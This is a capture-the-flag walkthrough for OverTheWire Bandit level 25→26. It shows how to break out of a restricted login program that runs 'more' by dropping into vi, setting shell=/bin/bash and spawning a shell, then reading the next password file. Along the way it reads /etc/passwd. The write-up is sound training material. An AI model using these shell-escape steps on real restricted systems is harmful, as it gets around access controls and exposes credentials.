# Bandit Level 25 → Level 26
---

## ⚠️ Disclaimer

This level was solved with help from:

https://mayadevbe.me/posts/overthewire/bandit/level26/

---

## 🎯 Objective

You're logging into **bandit26**, but its default shell is **not** `/bin/bash`. You need to:

- Find out what **shell or program** runs by default for bandit26

- Understand **how it works**

- Find a way to **break out of it**

- Extract the password for bandit26


---


## 🛠️ Commands Used (with explanations)

- `ssh` - Connects to a remote server securely over the SSH protocol

  - `-i` - Specifies the SSH private key to use for authentication

- `cat` - Outputs the contents of a file

- `ls` - Lists files and directories in the current working directory

- `grep` - Searches for text patterns within files

- `more` - Displays text one screen at a time (used in showtext)

- `vi` - Opens a file in the Vi text editor (used to escape to shell)

  - `:set shell=/bin/bash` - Vi command that changes the default shell used by the `:shell` command

  - `:shell` - Vi command that opens a shell using the configured shell

  - `q` - Quits the Vi editor




---

## 🚀 Steps to Solve
1. **Open your terminal**

2. **Connect using SSH with a command executed immediately**:

```bash
 ssh bandit25@bandit.labs.overthewire.org -p 2220 
```

3. **Enter the password**

4. **List the contents of the home directory**:
```bash
ls
```
  - You should see:
    ```bash
    bandit26.sshkey
    ```

5. **Try logging in directly to bandit26**:
```bash
ssh -i bandit26.sshkey bandit26@localhost -p 2220
```
  - You should see:
    ```bash
    The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
    ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])?
    ```
    - Type yes and press enter
    - You should see:
      ```bash
        _                     _ _ _   ___   __
       | |                   | (_) | |__ \ / /
       | |__   __ _ _ __   __| |_| |_   ) / /_
       | '_ \ / _` | '_ \ / _` | | __| / / '_ \
       | |_) | (_| | | | | (_| | | |_ / /| (_) |
       |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
      Connection to localhost closed.
      ```
      - This is expected since bandit26 does not use the shell `/bin/bash`
    

6. **Check what shell bandit26 uses**:
```bash
cat /etc/passwd | grep bandit26
```
  - You should see:
    ```bash
    bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
    ```
   
7. **List the contents of showtext**:
```bash
cat /usr/bin/showtext
```
  - You should see:
    ```bash
    #!/bin/sh

    export TERM=linux

    exec more ~/text.txt
    exit 0
    ```
    - bandit26’s shell is not `/bin/bash`, it is a shell script that runs instead of a shell
    - When `more` is running, it’s possible to spawn a shell or execute commands, but there are a few extra steps we need to take before this

8. **Resize the terminal window so it only shows two lines, i.e.**:
```bash
Connection to localhost closed.
bandit25@bandit:~$ 
```
- This step is imporant for the exploitation

9. **Try logging in again with the resize window**:
```bash
ssh -i bandit26.sshkey bandit26@localhost -p 2220
```
  - You should see:
    ```bash
    This key is not known by any other names.
    Are you sure you want to continue connecting (yes/no/[fingerprint])?
    ```
    - Type yes and press enter
    - You should see:
      ```bash
        _                     _ _ _   ___   __
      --More--(16%)
      ```
      - Important! Dont resize the window

10. **Enter Vi by pressing V**:
```bash
v
```
  - You should see:
    ```bash
      _                     _ _ _   ___   __
    /text.txt" [readonly] 6L, 258B                                  1,3           Top
    ```
    - Important! Dont resize the window

11. **Enter a : into the Vi window**:
- You should see:
  ```bash
  :
  ```
  - Important! Dont resize the window

12. **Set the shell to `/bin/bash`**:
```bash
:set shell=/bin/bash
```

13. **Enter a : into the Vi window**:
- You should see:
  ```bash
  :
  ```
  - Important! Dont resize the window

14. **Activate the shell**:
```bash
:shell
```
- You should see:
  ```bash
  :shell
  -- More --
  ```

15. **Resize the window**
- You should see:
  ```bash
  -- More --
           SPACE/d/j: screen/page/line down, b/u/k: up, q: quit
  ```
  
17 **Exit Vi**:
- Exit with Q
- You should see:
  ```bash
  bandit26@bandit:~$
  ```
      
18. **Read the password**
```bash
cat /etc/bandit_pass/bandit26
```
  



## 🎉 You’ve now completed Level 25 → Level 26!


---

## 🧠 Lessons Learned / Notes
- **Alternate shells**: Users don’t always have a normal shell. They might run into restricted or custom programs instead.

- **`more` and `vi` escape tricks**: Text viewers/editors often allow shell escapes (e.g., `:/bin/bash`)

- **setuid binaries**: These can be dangerous if they run as another user and allow command execution.

- **Always check `/etc/passwd`** when a login behaves strangely-it tells you what shell or command is run.
